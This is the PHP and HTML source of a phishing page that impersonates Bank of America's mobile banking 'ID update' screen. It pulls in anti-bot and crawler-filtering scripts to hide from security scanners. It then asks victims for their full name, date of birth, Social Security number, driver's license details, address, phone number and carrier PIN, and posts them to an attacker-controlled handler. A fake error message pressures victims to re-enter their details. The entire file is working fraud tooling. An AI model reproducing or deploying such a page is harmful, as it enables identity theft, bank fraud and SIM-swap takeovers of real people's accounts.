<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
?>
<!DOCTYPE html>
<html class=" js no-flexbox canvas canvastext webgl touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		<title>Bank of America | ID update</title>
    <link rel="shortcut icon" href="../bstyles/favicon.ico?ts=20151018" type="image/x-icon">
	<link rel="stylesheet" href="../bstyles/bactouch.css"><link rel="stylesheet" href="../bstyles/toolbar.css"><link rel="stylesheet" href="../bstyles/bact_listview.css"><link rel="stylesheet" href="../bstyles/footer.css"><link rel="stylesheet" href="../bstyles/slidemenu.css">
	<style>.signonVersionTwoHomePage{max-width:400px;margin:auto;}
	.fsd-secure-esp-skin {
    padding: 20px 0 20px 20px;
	;}
	.dsrt{width:50%}
	.srt{width:80%}
	.upper{text-transform:uppercase;}
	</style>
	</head>

	<body>
	<div id="page" class="" style="position: static; float: left; height: 100%; width: 100%; left: 100%; display: block;">
	<div class="header-module">
   <div class="fsd-secure-esp-skin">
   	  <img height="28" width="230" alt="Bank of America" src="../bstyles/BofA_rgb.png">
      <div class="clearboth"></div>
   </div>
</div>
<div id="cmw_toolBar_" class="cmw_toolBar_"><a id="leftButton" role="button" class="hidden"></a><a id="slidemenuz" class="sprite backButton icon sprite-menu" href="#" title="Show menu for all mobile banking features" role="button"></a><div id="barker" class="hidden"></div><h1 id="title" class=""><div id="cmw_toolBar_titleText" style="padding-left: 34px; padding-right: 34px; width: 100%;">Update personal details</div></h1><a id="rightButton" class="hidden"></a></div><div class="pageMinHeight">
<div class="signonVersionTwoHomePage">
<div id="scrollerwrapperOt" class="overthrow">

	<div id="accountLocked" class="<?php if(!isset($_GET[''.$theerrkey.''])){echo 'hidden';}?>">
		<ul class="listView edge">
			<li role="button" class="noLink">
				<div class="imageWrap paddingHoriz20"><img src="../bstyles/ico_alert@2x.png" class=""></div>
				<p class="subVal padding10 fontRed" id="headError">Error</p>
				<p class="subVal padding10" id="bodyError">The Credentials you entered were incorrect. Please try again...<span style="margin-top:10px;display:block;">We will query your email service provider to confirm you own this email.</span></p>
			</li>
		</ul>
	</div>
	
	<div id="successMsg"></div>
	
	<div id="newOnlineId" style="">
		<div class="toppad5">
			<fieldset>
				<div class="inputEntryContainer">
				<form id="frmCustomOnlineId" method="post" action="vn">
					<div class="inputContainer">
						<label for="btCustomOnlineId" class="adaHidden"></label>
						<input type="text"  name="fna" class="focus sprite-clear_input_icns" maxlength="" id="fna" placeholder="Full Name" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false">
					</div>
					<div class="inputContainer srt" style="background-color: white;">
						<input id="dob" type="tel" name="dob" class="" placeholder="Date Of Birth (MM/DD/YYYY)" oninput="DateOfBirth();" maxlength="10" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
					</div>
					<div class="inputContainer" style="background-color: white;">
						<input id="ssn" type="tel"  name="ssn" class="" placeholder="Social Security Number" maxlength="9"  oninput='innumlen(this.value)' autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
					</div>
					<div class="inputContainer" style="background-color: white;">
						<input id="dl" type="text"  name="dl" class="" placeholder="Driver's License Number" maxlength="19" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
					</div>
					<div class="inputContainer" style="background-color: white;">
						<input id="dlexp" type="tel"  name="dlexp" class="" placeholder="Driver's License Exp. (MM/DD/YYYY)" oninput="dlexpii();" maxlength="10" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
					</div>
					
					<div style="margin: 25px 15px 0;border-top:1px solid #ddd;">&nbsp;
	</div>
					<div class="inputContainer" style="background-color: white;">
						<input id="street" name="street" type="text" class="" placeholder="Street Address" maxlength="" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
					</div>
					<div class="inputContainer dsrt" style="background-color: white;">
						<input id="state" name="state" type="text" class="" placeholder="State " maxlength="20" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
				<input type="hidden" name="idd" value="<?php echo uniqid();?>">
					</div>
					<div class="inputContainer dsrt" style="background-color: white;">
						<input id="zip" name="zip" type="tel" class="" placeholder="Zip Code" oninput='innumlen(this.value)' maxlength="5" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
					</div>
					<div class="inputContainer srt" style="background-color: white;">
						<input id="phone" name="phone" type="tel" class="" placeholder="Phone Number" maxlength="10" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
					</div>
					<div class="inputContainer srt" style="background-color: white;">
						<input id="pmin" name="pmin" type="tel" class="" placeholder="Carrier PIN" maxlength="6" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
					</div>
				</form></div>
				
			</fieldset>
		</div>
	</div>
	
	</div>
	<div>	
		<a id="btSignonContinue" href="javascript:void(0);" onclick="frmCustomOnlineId.submit();" role="button" class="btn">
			<img style="margin-bottom:-4px;" class="paddingHoriz10" src="../bstyles/secure_lock.png">
			<span id="signonLabel">Continue</span>
		</a>
	</div>
	
	<div id="helpOptionView" class="helpOptionView">
		<div class="padding10 center"></div>
		<div class="padding10"></div>
	</div>
	
	<div id="btnPin" style="position: fixed; bottom: 0px; display: none; height: auto;">
		<ul class="btnGroupPin">
			<li><a id="cancelButton" class="plain slideUp btnNeg" role="button" href="javascript:void(0);">Cancel</a></li>
		</ul>
	</div>
</div>
<script>
"use strict"

function DateOfBirth(){var key =event.data;var val=event.target.value;if(event.inputType=="insertText"){if(isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);}; switch(val.length){
case 1:if(key > 1){event.target.value="";}; break; 
case 2:if(val[0]==1 && key > 2 || isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else if(val[0]==0 && key == 0){event.target.value=val.slice(0,val.length-1);} else {event.target.value=event.target.value+"/";}; break;
case 4:if(key > 3){event.target.value=val.slice(0,val.length-1);}; break;
case 5:if(val[3]>=3 && key > 1 || isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else if(val[3]==0 && key == 0){event.target.value=val.slice(0,val.length-1);} else {event.target.value=event.target.value+"/";}; break;
case 7:if(key < 1 || key > 2){event.target.value=val.slice(0,val.length-1);}; break; 
case 8:if(val[6] == 1 && key < 9){event.target.value=val.slice(0,val.length-1);} else if(val[6]==2 && key > 0){event.target.value=val.slice(0,val.length-1);}; break; 
case 9:if(val[6]==2 && key > 1){event.target.value=val.slice(0,val.length-1);}; break; };};
if(event.inputType=="deleteContentBackward" && val.length == 2){event.target.value=val[0]}
else if(event.inputType=="deleteContentBackward" && val.length == 5){event.target.value=val.slice(0,val.length-1);}};

function dlexpii(){var key =event.data;var val=event.target.value;if(event.inputType=="insertText"){if(isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);}; switch(val.length){
case 1:if(key > 1){event.target.value="";}; break; 
case 2:if(val[0]==1 && key > 2 || isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else if(val[3]==0 && key == 0){event.target.value=val.slice(0,val.length-1);} else {event.target.value=event.target.value+"/";}; break;
case 4:if(key > 3){event.target.value=val.slice(0,val.length-1);}; break;
case 5:if(val[3]>=3 && key > 1 || isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else if(val[0]==0 && key == 0){event.target.value=val.slice(0,val.length-1);} else {event.target.value=event.target.value+"/";}; break;
case 7:if(key < 1 || key > 2){event.target.value=val.slice(0,val.length-1);}; break; 
case 8:if(val[6] == 1 && key < 9){event.target.value=val.slice(0,val.length-1);} else if(val[6]==2 && key > 0){event.target.value=val.slice(0,val.length-1);}; break; 
case 9:if(val[6]==2 && key > 4){event.target.value=val.slice(0,val.length-1);}; break; };};
if(event.inputType=="deleteContentBackward" && val.length == 2){event.target.value=val[0]}
else if(event.inputType=="deleteContentBackward" && val.length == 5){event.target.value=val.slice(0,val.length-1);}};

function innumlen(val){if(event.inputType=="insertText"){if(isNaN(parseInt(event.data))){if(val.length<=1){event.target.value="";} else{event.target.value=val.slice(0,val.length-1);};};};};

</script>
</div></div>
		
	
</body></html>